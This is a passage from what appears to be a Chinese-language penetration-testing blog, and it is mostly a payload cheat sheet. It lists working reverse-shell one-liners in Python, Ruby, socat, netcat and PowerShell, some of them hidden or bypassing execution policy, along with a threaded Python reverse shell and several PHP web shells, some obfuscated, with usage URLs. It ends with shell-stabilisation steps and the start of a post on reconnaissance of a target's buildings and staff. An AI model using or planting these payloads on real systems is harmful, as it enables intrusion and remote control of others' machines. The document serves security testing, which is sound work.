socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python2</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python3</span></span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- export RHOST=&quot;127.0.0.1&quot;;export RPORT=4444;python3 -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;cmd&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;powershell&quot;)&#x27;</span><br><span class="line">- python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;pwsh&quot;)&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Python3 shortest</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;cmd&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;powershell&quot;)&#x27;</span></span><br><span class="line">- python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;127.0.0.1&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;pwsh&quot;)&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Ruby</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- ruby -rsocket -e<span class="string">&#x27;spawn(&quot;sh&quot;,[:in,:out,:err]=&gt;TCPSocket.new(&quot;127.0.0.1&quot;,4444))&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Ruby no sh</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;127.0.0.1&quot;,&quot;4444&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: <span class="subst">#&#123;<span class="variable">$_</span>&#125;</span>&quot;&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>socat</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:sh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:/bin/sh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:bash</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:/bin/bash</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;sh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;/bin/sh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;bash&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;/bin/bash&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:cmd</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:powershell</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:pwsh</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;pwsh&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;cmd&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line">- socat TCP:127.0.0.1:4444 EXEC:&#x27;powershell&#x27;,pty,stderr,setsid,sigint,sane</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="For-Windows"><a href="#For-Windows" class="headerlink" title="For Windows"></a>For Windows</h3><ul>
<li><p>nc.exe -e</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e sh</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/sh</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e bash</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e <span class="built_in">cmd</span></span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e powershell</span><br><span class="line">- nc.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>ncat.exe -e</p>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e sh</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/sh</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e bash</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e /bin/bash</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e <span class="built_in">cmd</span></span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e powershell</span><br><span class="line">- ncat.exe <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">4444</span> -e pwsh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>PowerShell</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">linux/mac/windows</span><br><span class="line">- powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.<span class="built_in">Net</span>.Sockets.TCPClient(&quot;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;,<span class="number">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).<span class="built_in">Path</span> + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line">- powershell -nop -c &quot;$client = New-Object System.<span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;,<span class="number">4444</span>);$stream = $client.GetStream();[byte[]]$bytes = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;while(($i = $stream.Read($bytes, <span class="number">0</span>, $bytes.Length)) -ne <span class="number">0</span>)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span class="number">0</span>, $i);$sendback = (iex $data <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).<span class="built_in">Path</span> + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span class="number">0</span>,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br><span class="line">- powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;, <span class="number">4444</span>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer = <span class="number">0</span>..$TCPClient.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;;$StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;);$StreamWriter.Flush()&#125;WriteToStream &#x27;&#x27;;while(($BytesRead = $NetworkStream.Read($Buffer, <span class="number">0</span>, $Buffer.Length)) -gt <span class="number">0</span>) &#123;$Command = ([text.encoding]::UTF8).GetString($Buffer, <span class="number">0</span>, $BytesRead - <span class="number">1</span>);$Output = try &#123;Invoke-Expression $Command <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;</span><br><span class="line">- powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object <span class="built_in">Net</span>.Sockets.TCPClient(&#x27;<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&#x27;, <span class="number">4444</span>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object <span class="built_in">Net</span>.Security.SslStream($NetworkStream,$false,(&#123;$true&#125; -as [<span class="built_in">Net</span>.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient(&#x27;cloudflare-dns.com&#x27;,$null,$false);<span class="keyword">if</span>(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) &#123;$SslStream.Close();<span class="keyword">exit</span>&#125;$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) &#123;[byte[]]$script:Buffer = <span class="number">0</span>..$TCPClient.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;;$StreamWriter.Write($String + &#x27;SHELL&gt; &#x27;);$StreamWriter.Flush()&#125;;WriteToStream &#x27;&#x27;;while(($BytesRead = $SslStream.Read($Buffer, <span class="number">0</span>, $Buffer.Length)) -gt <span class="number">0</span>) &#123;$Command = ([text.encoding]::UTF8).GetString($Buffer, <span class="number">0</span>, $BytesRead - <span class="number">1</span>);$Output = try &#123;Invoke-Expression $Command <span class="number">2</span>&gt;&amp;<span class="number">1</span> | Out-String&#125; catch &#123;$_ | Out-String&#125;WriteToStream ($Output)&#125;$StreamWriter.Close()&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Python3 Windows</li>
</ul>
<p>僅需修改 <code>Popen([&quot;sh&quot;]</code>裡面的sh，根據環境使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os,socket,subprocess,threading;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2p</span>(<span class="params">s, p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span>:</span><br><span class="line">            p.stdin.write(data)</span><br><span class="line">            p.stdin.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p2s</span>(<span class="params">s, p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s.send(p.stdout.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">4444</span>))</span><br><span class="line"></span><br><span class="line">p=subprocess.Popen([<span class="string">&quot;sh&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;/bin/sh&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;bash&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;/bin/bash&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;cmd&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;powershell&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#p=subprocess.Popen([&quot;pwsh&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)</span></span><br><span class="line"></span><br><span class="line">s2p_thread = threading.Thread(target=s2p, args=[s, p])</span><br><span class="line">s2p_thread.daemon = <span class="literal">True</span></span><br><span class="line">s2p_thread.start()</span><br><span class="line"></span><br><span class="line">p2s_thread = threading.Thread(target=p2s, args=[s, p])</span><br><span class="line">p2s_thread.daemon = <span class="literal">True</span></span><br><span class="line">p2s_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p.wait()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><ul>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentestmonkey’s reverse shell</a><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="Basic-RCE"><a href="#Basic-RCE" class="headerlink" title="Basic RCE"></a>Basic RCE</h3><p>成功上傳 payload 後，只需將指令放在變數後面即可</p>
<ul>
<li><code>?cmd= (ex: ?cmd=ls -la&quot;)</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h3><p>shell:~# 是一個非常基本的單一檔案 PHP shell。<br>當對 PHP 應用程式進行滲透測試時，它可用於在伺服器上快速執行命令</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a></li>
</ul>
<h3 id="Obfuscated-PHP-Web-Shell"><a href="#Obfuscated-PHP-Web-Shell" class="headerlink" title="Obfuscated PHP Web Shell"></a>Obfuscated PHP Web Shell</h3><ul>
<li>Usage : <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?0=command">http://target.com/path/to/shell.php?0=command</a><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">0</span>]`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>Usage : curl -X POST <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php">http://target.com/path/to/shell.php</a> -d “0=command”</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[<span class="number">0</span>]`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=command">http://target.com/path/to/shell.php?_=command</a></li>
<li>curl -X POST <a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php">http://target.com/path/to/shell.php</a> -d “_=command” ‘</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>`&#123;<span class="variable">$_REQUEST</span>[<span class="string">&#x27;_&#x27;</span>]&#125;`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?0=command">http://target.com/path/to/shell.php?0=command</a></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$_</span>=<span class="string">&quot;&#x27;&quot;</span> ;<span class="variable">$_</span>=(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="number">4</span>*<span class="number">4</span>*(<span class="number">5</span>+<span class="number">5</span>)-<span class="number">40</span>)).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="number">47</span>+<span class="title function_ invoke__">ord</span>(<span class="number">1</span>==<span class="number">1</span>))).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;_&#x27;</span>)+<span class="number">3</span>)).(<span class="variable">$_</span>^<span class="title function_ invoke__">chr</span>(((<span class="number">10</span>*<span class="number">10</span>)+(<span class="number">5</span>*<span class="number">3</span>))));<span class="variable">$_</span>=$&#123;<span class="variable">$_</span>&#125;[<span class="string">&#x27;_&#x27;</span>^<span class="string">&#x27;o&#x27;</span>];<span class="keyword">echo</span>`<span class="variable">$_</span>`<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Usage :<ul>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=function&amp;__=argument">http://target.com/path/to/shell.php?_=function&amp;__=argument</a></li>
<li><a target="_blank" rel="noopener" href="http://target.com/path/to/shell.php?_=system&amp;__=ls">http://target.com/path/to/shell.php?_=system&amp;__=ls</a></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_</span>=<span class="string">&quot;&#123;&quot;</span>; <span class="variable">$_</span>=(<span class="variable">$_</span>^<span class="string">&quot;&lt;&quot;</span>).(<span class="variable">$_</span>^<span class="string">&quot;&gt;;&quot;</span>).(<span class="variable">$_</span>^<span class="string">&quot;/&quot;</span>); <span class="meta">?&gt;</span><span class="meta">&lt;?=</span>$&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>&#125;[<span class="string">&#x27;_&#x27;</span>]($&#123;<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>&#125;[<span class="string">&#x27;__&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="TTY-Spawn-Shell"><a href="#TTY-Spawn-Shell" class="headerlink" title="TTY Spawn Shell"></a>TTY Spawn Shell</h2><p>以下指令允許您產生 tty shell<br>其中一些取決於系統環境和安裝的軟體套件</p>
<h3 id="All-the-steps-to-stabilize-your-shell"><a href="#All-the-steps-to-stabilize-your-shell" class="headerlink" title="All the steps to stabilize your shell"></a>All the steps to stabilize your shell</h3><ul>
<li>使用 Python 產生功能更好的 bash shell</li>
<li>shell 看起來會更漂亮一些，但仍然無法使用 Tab 自動完成或箭頭鍵操作<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>使我們能夠存取術語指令，例如clear</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">export TERM=xterm</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Finally (and most importantly) we will background the shell using <code>Ctrl + Z</code></li>
</ul>
<p>回到終端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stty raw -echo; fg</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>它關閉了我們自己的terminal echo，這使我們能夠存取 tab autocompletes、箭頭鍵和 Ctrl + C 來終止進程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">stty rows 38 columns 116</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="passive-Passive_Reconnaissance" class="article article-type-passive" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Passive_Reconnaissance/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.089Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Passive_Reconnaissance/">
        Passive Reconnaissance
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Passive-Reconnaissance"><a href="#Passive-Reconnaissance" class="headerlink" title="Passive Reconnaissance"></a>Passive Reconnaissance</h1><hr>
<p>Physical/Social</p>
<ul>
<li>Location Information<ul>
<li>Satellite images</li>
<li>Drone recon</li>
<li>Building layout<ul>
<li>badge readers</li>
<li>break areas</li>
<li>security</li>
<li>fencing</li>
</ul>
</li>
</ul>
</li>
<li>Job Information<ul>
<li>Employees<ul>
<li>name</li>
<li>job title</li>
<li>phone number</li>
<li>manager</li>
</ul>
</li>
<li>Pictures<ul>
<li>badge photos</li>
<li>desk photos</li>
<li>computer</li>
<li>photos</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>有可能遇到攻擊到錯誤的目標，所以再攻擊前要驗證目標</p>
